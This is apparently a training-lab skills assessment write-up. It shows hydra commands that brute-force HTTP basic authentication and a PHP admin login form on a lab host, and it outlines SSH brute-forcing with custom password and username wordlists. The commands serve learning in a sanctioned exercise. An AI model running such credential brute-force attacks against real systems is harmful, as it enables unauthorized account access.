# 🧊 Skills Assessment

## **Website**

_**When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.**_

<figure><img src="../../../.gitbook/assets/image (1351).png" alt=""><figcaption></figcaption></figure>

```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.255.149 -s 43320 http-get /
```

<figure><img src="../../../.gitbook/assets/image (1353).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1352).png" alt=""><figcaption></figcaption></figure>

_**Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?**_

```
hydra -l user -P /usr/share/wordlists/rockyou.txt.gz 83.136.255.149 -s 43320 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
```

<figure><img src="../../../.gitbook/assets/image (1354).png" alt=""><figcaption></figcaption></figure>

## Service Login

As you now have the name of an employee from the previous skills assessment question, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also, try using the 'username-anarchy' tool to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.



Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.
